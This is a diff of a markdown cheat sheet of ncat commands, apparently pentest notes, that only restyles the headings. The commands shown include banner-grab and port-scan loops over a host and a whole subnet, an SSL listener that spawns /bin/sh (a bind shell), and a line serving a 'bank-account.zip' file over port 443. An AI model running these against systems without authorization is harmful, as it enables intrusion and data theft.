@@ -1,8 +1,8 @@
 # ncat
 
-## Scanning&#x20;
+## <mark style="color:red;">Scanning</mark>
 
-### banner grab
+### <mark style="color:orange;">banner grab</mark>
 
 ```
 apt install ncat
@@ -10,7 +10,7 @@ apt install ncat
 for port in {1..65535}; do echo "" | ncat -vvn 192.168.56.170 $port 2>&1 | grep "READ SUCCESS for EID " | grep -v "peer unspecified" | cut -d ":" -f 3-  ; done
 ```
 
-### banner grab the whole subnet
+### <mark style="color:orange;">banner grab the whole subnet</mark>
 
 ```
 apt install ncat
@@ -18,7 +18,7 @@ apt install ncat
 for hosts in {1..254}; do for ports in {1..65535}; do echo "" | ncat -vvn 192.168.1.$hosts $ports 2>&1 | grep "READ SUCCESS for EID " | grep -v "peer unspecified" ; done ;done
 ```
 
-### port scanner
+### <mark style="color:orange;">port scanner</mark>
 
 ```
 tcp scan:
@@ -28,14 +28,14 @@ udp scan:
 parallel ncat -nvuz [host] ::: {1..65535}  2>&1 | grep "Connected"
 ```
 
-## SSL connection
+## <mark style="color:red;">SSL</mark> <mark style="color:red;">connection</mark>
 
 ```
 listener: nc --ssl -nvlp [local port] -e /bin/sh
 client: nc --ssl localhost [remote port]
 ```
 
-## FTP
+## <mark style="color:red;">FTP</mark>
 
 ```
 nc -l -p 443 < C:\bank-account.zip --from machine that has the file, this one is windows.
